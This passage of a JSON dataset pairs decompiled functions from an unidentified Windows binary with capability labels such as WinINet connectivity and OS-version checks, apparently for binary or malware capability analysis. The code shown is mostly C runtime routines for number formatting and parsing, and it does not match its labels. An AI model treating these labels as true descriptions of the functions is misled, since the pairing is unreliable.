0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049f946;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049f946:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049f946;\n    param_1[7] = 7;\n    puStack8 = *0x571ca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x004a142f:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a1433:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a1436:\n            cVar5 = fcn.00404c41(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a13db:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a1436;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x004a13ef;\n                if (uVar9 < 0x45) goto code_r0x004a15bf;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004a15bf;\n                    goto code_r0x004a13c3;\n                }\n            }\ncode_r0x004a143f:\n            cVar5 = fcn.00401e7e();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00402da1();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x004a143f;\n            if (uVar9 != 99) goto code_r0x004a15bf;\ncode_r0x004a13ef:\n            cVar5 = fcn.00404f25(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00403fda();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x004a143f;\n            if (uVar9 == 0x69) goto code_r0x004a142f;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00405542();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004a15bf;\n                cVar5 = fcn.00401a55();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004a15bf;\n                arg_ch_00 = 0;\n                goto code_r0x004a13db;\n            }\n            goto code_r0x004a1433;\n        }\ncode_r0x004a13c3:\n        cVar5 = fcn.0040119a();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004a15bf;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x004a14ca;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a14ca:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.004040ed(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405bd2(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.004061b3(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405bd2(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x004a15bf:\n    uVar7 = fcn.004030bc(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2629
    },
    "00403c6a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403c6a(int32_t param_1)\n\n{\n    uchar uVar1;\n    char cVar2;\n    \n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.00401898(param_1 + 0x28);\n        return uVar1;\n    }\n    cVar2 = fcn.004065fa();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    cVar2 = fcn.00406622();\n    if ((cVar2 != '\\0') && (*(param_1 + 0x28) < 0)) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 169
    },
    "00403cce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403cce(char *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint uVar6;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        return 0x16;\n    }\n    if (arg_ch != 0) {\n        *arg_8h = '\\0';\n        iVar3 = arg_10h;\n        if (arg_10h < 1) {\n            iVar3 = 0;\n        }\n        if (arg_ch <= iVar3 + 1U) {\n            puVar2 = fcn.00403a35();\n            uVar6 = 0x22;\n            goto code_r0x004d9091;\n        }\n        if (arg_14h != NULL) {\n            pcVar4 = arg_14h[2];\n            *arg_8h = '0';\n            pcVar5 = arg_8h;\n            while( true ) {\n                pcVar5 = pcVar5 + 1;\n                if (arg_10h < 1) break;\n                cVar1 = *pcVar4;\n                if (cVar1 == '\\0') {\n                    cVar1 = '0';\n                }\n                else {\n                    pcVar4 = pcVar4 + 1;\n                }\n                *pcVar5 = cVar1;\n                arg_10h = arg_10h + -1;\n            }\n            *pcVar5 = '\\0';\n            if ((-1 < arg_10h) && (cVar1 = fcn.004d8fa1(pcVar4, *arg_14h, arg_18h, arg_1ch),  cVar1 != '\\0')) {\n                while( true ) {\n                    pcVar5 = pcVar5 + -1;\n                    if (*pcVar5 != '9') break;\n                    *pcVar5 = '0';\n                }\n                *pcVar5 = *pcVar5 + '\\x01';\n            }\n            if (*arg_8h == '1') {\n                arg_14h[1] = arg_14h[1] + 1;\n            }\n            else {\n                pcVar4 = arg_8h + 1;\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                fcn.004059ac(arg_8h, arg_8h + 1, pcVar4 + (1 - (arg_8h + 2)));\n            }\n            return 0;\n        }\n    }\n    puVar2 = fcn.00403a35();\n    uVar6 = 0x16;\ncode_r0x004d9091:\n    *puVar2 = uVar6;\n    fcn.004037ce();\n    return uVar6;\n}\n",
        "token_count": 703
    },
    "00403ce2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00403ce2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00403dbe();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a8c50:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a8c50;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.00403a35();\n                            *puVar4 = 0x16;\n                            fcn.004037ce();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 457
    },
    "00403cec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403cec(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char **ppcVar9;\n    char *pcVar10;\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    char *pcVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    uint uVar14;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.00405434(0x7c);\n    iVar12 = *(unaff_EBP + 0x18);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    uVar7 = *(iVar12 + 0x14);\n    *(unaff_EBP + -0x74) = arg_10h_00;\n    *(unaff_EBP + -0x78) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x7c) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.0040669a(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar12, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x00467246;\n    }\n    fcn.004032d3(*(iVar12 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00406433(unaff_EBP + -0x70);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x80) = piVar5;\n    fcn.00405146();\n    pcVar1 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x50);\n    (*pcVar1)();\n    uVar14 = *(iVar12 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -100) = *(unaff_EBP + -0x78);\n    *(unaff_EBP + -0x54) = 0;\n    *(unaff_EBP + -0x53) = 0;\n    fcn.004032d3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00403616(unaff_EBP + -0x70);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar1 = *(*piVar5 + 0x1c);\n    (**0x578000)(0x553dd0, 0x553ddf, unaff_EBP + -0x20);\n    (*pcVar1)();\n    uVar14 = *(unaff_EBP + -0x58);\n    cVar2 = fcn.00404011(uVar14);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        if (cVar2 == *(unaff_EBP + -0x15)) {\n            puVar6 = *(unaff_EBP + -0x78);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar2 = *(arg_10h_00 + 5);\n            }\n            if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x00466cdc;\n            puVar6 = *(unaff_EBP + -0x78);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.00401c7b();\n    }\n    else {\ncode_r0x00466cdc:\n        puVar6 = *(unaff_EBP + -100);\n    }\n    piVar5 = *(unaff_EBP + -0x7c);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar11 = puVar6 + 1;\n    *(unaff_EBP + -100) = pcVar11;\n    iVar12 = *piVar5;\n    *(unaff_EBP + -0x51) = 0;\n    *(unaff_EBP + -0x68) = 0;\n    *(unaff_EBP + -0x5c) = 0;\n    *(unaff_EBP + -0x84) = ((iVar12 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar13 = unaff_EBP + -0x50;\n    *(unaff_EBP + -0x60) = pcVar13;\n    if (0xf < *(unaff_EBP + -0x3c)) {\n        pcVar13 = *(unaff_EBP + -0x50);\n        *(unaff_EBP + -0x60) = pcVar13;\n    }\n    if ((*pcVar13 == '\\x7f') || (*pcVar13 < '\\x01')) {\n        cVar2 = fcn.00404011(uVar14);\n        if (cVar2 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar7 = fcn.00402f22(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar7) break;\n                iVar12 = *(unaff_EBP + -0x68);\n                if (*(unaff_EBP + -0x84) == iVar12 || *(unaff_EBP + -0x84) < iVar12) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x53) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar12 != 0)) {\n                    *pcVar11 = *(uVar7 + 0x553dd0);\n                    pcVar11 = pcVar11 + 1;\n                    *(unaff_EBP + -0x68) = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.00401c7b();\n                cVar2 = fcn.00404011(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -100) = pcVar11;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x40) == 0) {\n            *(unaff_EBP + -0x52) = 0;\n        }\n        else {\n            uVar3 = fcn.0040596b();\n            *(unaff_EBP + -0x52) = uVar3;\n        }\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x28) = 0;\n        *(unaff_EBP + -0x24) = 0xf;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar12 = 0;\n        uVar7 = fcn.00404011(*(unaff_EBP + -0x58));\n        if (uVar7 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x24);\n            pcVar13 = *(unaff_EBP + -0x38);\ncode_r0x00466e8a:\n            do {\n                pcVar10 = *(unaff_EBP + -0x60);\n                while( true ) {\n                    if ((iVar12 == 0) || (cVar2 = *pcVar10,  *(unaff_EBP + -0x52) = cVar2,  cVar2 == '\\x7f'))\n                    goto code_r0x00466edf;\n                    iVar12 = iVar12 + -1;\n                    if (iVar12 != 0) {\n                        pcVar10 = unaff_EBP + -0x38;\n                        if (0xf < uVar7) {\n                            pcVar10 = pcVar13;\n                        }\n                        arg_10h_00 = *(unaff_EBP + -0x74);\n                        if (*(unaff_EBP + -0x52) != pcVar10[iVar12]) goto code_r0x00466edb;\n                    }\n                    if (iVar12 == 0) {\n                        pcVar10 = unaff_EBP + -0x38;\n                        if (0xf < uVar7) {\n                            pcVar10 = pcVar13;\n                        }\n                        arg_10h_00 = *(unaff_EBP + -0x74);\n                        if (*(unaff_EBP + -0x52) < *pcVar10) goto code_r0x00466edb;\n                    }\n                    pcVar10 = *(unaff_EBP + -0x60) + 1;\n                    if (*pcVar10 < '\\x01') break;\n                    *(unaff_EBP + -0x60) = pcVar10;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                uVar7 = fcn.004019e7();\n            }\n            uVar7 = uVar7 & 0xffffff00 | *(arg_10h_00 + 5);\n            *(unaff_EBP + -0x6c) = uVar7;\n            uVar7 = fcn.00402f22(unaff_EBP + -0x20, uVar7);\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x68);\n                *(unaff_EBP + -0x51) = 1;\n                if (*(unaff_EBP + -0x84) == iVar8 || *(unaff_EBP + -0x84) < iVar8) {\n                    *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x53) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar11 = *(uVar7 + 0x553dd0);\n                    pcVar11 = pcVar11 + 1;\n                    *(unaff_EBP + -100) = pcVar11;\n                    *(unaff_EBP + -0x68) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x38;\n                if (0xf < *(unaff_EBP + -0x24)) {\n                    iVar8 = *(unaff_EBP + -0x38);\n                }\n                if (*(iVar8 + iVar12) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x38;\n                    if (0xf < *(unaff_EBP + -0x24)) {\n                        iVar8 = *(unaff_EBP + -0x38);\n                    }\n                    *(iVar8 + iVar12) = *(iVar8 + iVar12) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x24);\n                pcVar13 = *(unaff_EBP + -0x38);\n                pcVar10 = unaff_EBP + -0x38;\n                if (0xf < uVar7) {\n                    pcVar10 = pcVar13;\n                }\n                if ((pcVar10[iVar12] == '\\0') || (*(unaff_EBP + -0x52) == '\\0')) goto code_r0x00466e6d;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(arg_10h_00 + 5);\n                    uVar7 = *(unaff_EBP + -0x24);\n                    pcVar13 = *(unaff_EBP + -0x38);\n                }\n                else {\n                    cVar2 = *(unaff_EBP + -0x6c);\n                }\n                if (cVar2 != *(unaff_EBP + -0x52)) goto code_r0x00466e6d;\n                fcn.00404543(0);\n                iVar12 = iVar12 + 1;\n            }\n            fcn.00401c7b();\n            uVar7 = fcn.00404011(*(unaff_EBP + -0x58));\n        } while (uVar7 == '\\0');\n        uVar7 = *(unaff_EBP + -0x24);\n        pcVar13 = *(unaff_EBP + -0x38);\ncode_r0x00466e6d:\n        if (iVar12 == 0) goto code_r0x00466e8a;\n        pcVar10 = unaff_EBP + -0x38;\n        if (0xf < uVar7) {\n            pcVar10 = pcVar13;\n        }\n        if ('\\0' < pcVar10[iVar12]) {\n            iVar12 = iVar12 + 1;\n            goto code_r0x00466e8a;\n        }\ncode_r0x00466edb:\n        *(unaff_EBP + -0x54) = 1;\ncode_r0x00466edf:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x6c) = pcVar13;\n            *(unaff_EBP + -0x60) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.0040411a(unaff_EBP + -0x6c, unaff_EBP + -0x60);\n                pcVar13 = *(unaff_EBP + -0x6c);\n            }\n            fcn.00401a2d(pcVar13);\n        }\n        uVar14 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = fcn.00404011(0x466f20);\n    if (cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar2 = *(arg_10h_00 + 5);\n        cVar4 = fcn.00401181();\n        if (cVar2 == cVar4) {\n            ppcVar9 = fcn.00401357();\n            arg_10h_00 = *(unaff_EBP + -0x74);\n            *pcVar11 = **ppcVar9;\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -100) = pcVar11;\n            fcn.00401c7b();\n        }\n        else {\n            arg_10h_00 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x7c) != 1000000000) && (*(unaff_EBP + -0x68) == 0)) {\n        cVar2 = fcn.00404011(uVar14);\n        if (cVar2 == '\\0') {\n            iVar12 = *(unaff_EBP + -0x5c);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) break;\n                *(unaff_EBP + -0x51) = 1;\n                iVar12 = iVar12 + -1;\n                fcn.00401c7b();\n                cVar2 = fcn.00404011(uVar14);\n            } while (cVar2 == '\\0');\n            *(unaff_EBP + -0x5c) = iVar12;\n            pcVar11 = *(unaff_EBP + -100);\n        }\n        iVar12 = *(unaff_EBP + -0x5c);\n        if (iVar12 < 0) {\n            *pcVar11 = '0';\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -0x5c) = iVar12 + 1;\n        }\n    }\n    while (cVar2 = fcn.00404011(uVar14),  cVar2 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        uVar7 = fcn.00402f22(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n        if (9 < uVar7) break;\n        iVar12 = *(unaff_EBP + -0x68);\n        if (iVar12 < *(unaff_EBP + -0x84)) {\n            *pcVar11 = *(uVar7 + 0x553dd0);\n            pcVar11 = pcVar11 + 1;\n            *(unaff_EBP + -0x68) = iVar12 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x53) = 1;\n        }\n        *(unaff_EBP + -0x51) = 1;\n        fcn.00401c7b();\n    }\n    pcVar13 = pcVar11;\n    if (*(unaff_EBP + -0x53) != '\\0') {\n        while (pcVar13 = pcVar13 + -1,  pcVar13 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x7c) = pcVar13;\n            ppcVar9 = fcn.00401357();\n            cVar2 = *pcVar13;\n            if (cVar2 != **ppcVar9) {\n                if (cVar2 != '9') {\n                    pcVar10 = *(unaff_EBP + -0x7c);\n                    *pcVar13 = cVar2 + '\\x01';\n                    pcVar13 = pcVar10;\n                    if (pcVar10 != *(unaff_EBP + -0x88)) goto code_r0x004670eb;\n                    break;\n                }\n                *pcVar13 = '0';\n            }\n        }\n        *(unaff_EBP + -0x5c) = *(unaff_EBP + -0x5c) + 1;\n        *pcVar13 = '1';\ncode_r0x004670eb:\n        uVar14 = *(unaff_EBP + -0x58);\n    }\n    cVar2 = *(unaff_EBP + -0x51);\n    pcVar13 = pcVar11;\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00404011(uVar14);\n        if (cVar2 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004019e7();\n            }\n            cVar2 = *(arg_10h_00 + 5);\n            if (cVar2 != *(unaff_EBP + -0x13)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar2 = *(arg_10h_00 + 5);\n                }\n                if (cVar2 != *(unaff_EBP + -0x14)) goto code_r0x00467228;\n            }\n            *pcVar11 = 'e';\n            pcVar13 = pcVar11 + 1;\n            fcn.00401c7b();\n            *(unaff_EBP + -0x51) = 0;\n            iVar12 = 0;\n            cVar2 = fcn.00404011(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                cVar2 = *(arg_10h_00 + 5);\n                if (cVar2 == *(unaff_EBP + -0x15)) {\n                    *pcVar13 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(arg_10h_00 + 5);\n                    }\n                    if (cVar2 != *(unaff_EBP + -0x16)) goto code_r0x0046718e;\n                    *pcVar13 = '-';\n                }\n                pcVar13 = pcVar11 + 2;\n                fcn.00401c7b();\n            }\ncode_r0x0046718e:\n            cVar2 = fcn.00404011(*(unaff_EBP + -0x58));\n            if (cVar2 == '\\0') {\n                do {\n                    cVar4 = *(arg_10h_00 + 4);\n                    cVar2 = *(unaff_EBP + -0x51);\n                    *(unaff_EBP + -0x51) = cVar2;\n                    if (cVar4 == '\\0') {\n                        fcn.004019e7();\n                        cVar2 = *(unaff_EBP + -0x51);\n                    }\n                    if (*(arg_10h_00 + 5) != *(unaff_EBP + -0x20)) {\n                        if (cVar2 == '\\0') goto code_r0x004671dd;\n                        break;\n                    }\n                    *(unaff_EBP + -0x51) = 1;\n                    fcn.00401c7b();\n                    cVar2 = fcn.00404011(*(unaff_EBP + -0x58));\n                } while (cVar2 == '\\0');\n                *pcVar13 = '0';\n                pcVar13 = pcVar13 + 1;\n            }\ncode_r0x004671dd:\n            do {\n                cVar2 = fcn.00404011(*(unaff_EBP + -0x58));\n                if (cVar2 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004019e7();\n                }\n                uVar7 = fcn.00402f22(unaff_EBP + -0x20, *(arg_10h_00 + 5));\n                if (9 < uVar7) break;\n                if (iVar12 < 8) {\n                    *pcVar13 = *(uVar7 + 0x553dd0);\n                    pcVar13 = pcVar13 + 1;\n                    iVar12 = iVar12 + 1;\n                }\n                *(unaff_EBP + -0x51) = 1;\n                fcn.00401c7b();\n            } while( true );\n        }\ncode_r0x00467228:\n        cVar2 = *(unaff_EBP + -0x51);\n    }\n    if ((*(unaff_EBP + -0x54) != '\\0') || (cVar2 == '\\0')) {\n        pcVar13 = *(unaff_EBP + -0x78);\n    }\n    *pcVar13 = '\\0';\n    fcn.00402a0e();\ncode_r0x00467246:\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 5645
    },
    "00403cf6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403cf6(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 0x14) != '\\0') {\n        *(param_1 + 0x14) = 0;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x22;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x14) = 0;\n    return 0x22;\n}\n",
        "token_count": 122
    },
    "00403d4b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403d4b(int32_t arg_8h, uint32_t arg_ch, int32_t **arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (arg_10h == NULL) {\n        arg_8h_00 = fcn.00404da4();\n        arg_ch = fcn.00406203(arg_8h_00, arg_8h, arg_ch);\n    }\n    else if (arg_8h + 1U < 0x101) {\n        arg_ch = *(**arg_10h + arg_8h * 2) & arg_ch;\n    }\n    else if ((*arg_10h)[1] < 2) {\n        arg_ch = 0;\n    }\n    else {\n        arg_ch = fcn.0040433b(arg_8h, arg_ch, arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 206
    },
    "00403d55": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d55(uint arg_8h)\n\n{\n    code **arg_8h_00;\n    int32_t *in_ECX;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (arg_8h != '\\0')) {\n        if (*in_ECX == 0) {\n            *in_ECX = 0;\n            in_ECX[1] = 0;\n            fcn.00404557(arg_8h);\n        }\n        else {\n            arg_8h_00 = fcn.0040528b(8);\n            if (arg_8h_00 == NULL) {\n                arg_8h_00 = NULL;\n            }\n            else {\n                *arg_8h_00 = vtable.charNode.0;\n                *(arg_8h_00 + 1) = arg_8h;\n            }\n            fcn.0040576d(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00403d7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
